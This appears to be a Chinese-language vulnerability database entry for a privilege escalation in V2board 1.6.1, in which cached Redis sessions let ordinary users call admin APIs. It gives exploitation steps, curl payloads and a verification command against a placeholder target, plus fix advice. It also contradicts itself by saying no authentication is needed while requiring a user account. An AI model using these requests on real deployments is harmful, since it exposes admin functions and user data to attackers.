---
id: V2BOARD-1.6-PRIVILEGE-ESCALATION
title: V2board 1.6.1 提权漏洞
product: v2board
vendor: V2board
version_affected: "<= 1.6.1"
severity: HIGH
tags: [priv_esc, auth_bypass, 无需认证]
fingerprint: ["V2board"]
---

## 漏洞描述

V2board 是一个多用户代理工具管理面板。在其 1.6.1 版本中，引入了对于用户 Session 的缓存机制，服务器会将用户的认证信息储存在 Redis 缓存中。但由于读取缓存时没有校验该用户是普通用户还是管理员，导致普通用户的认证信息即可访问管理员接口，造成提权漏洞。

## 影响版本

- V2board <= 1.6.1

## 前置条件

- 无需认证
- 需要一个普通用户账号

## 利用步骤

1. 使用普通用户账号登录获取 auth_data
2. 将 Authorization 头写入缓存
3. 使用该 Authorization 头访问管理员 API

## Payload

```bash
# 登录获取 auth_data
curl -X POST -d "email=user@example.com&password=password" http://target:8080/api/v1/passport/auth/login

# 使用 auth_data 访问管理员 API
curl -H "Authorization: <auth_data>" http://target:8080/api/v1/admin/user/fetch
```

## 验证方法

```bash
# 成功获取管理员数据即证明漏洞存在
curl -H "Authorization: <auth_data>" http://target:8080/api/v1/admin/user/fetch | grep id
```

## 修复建议

1. 升级 V2board 至最新版本
2. 修复 Redis 缓存校验逻辑
3. 对管理员接口进行权限校验
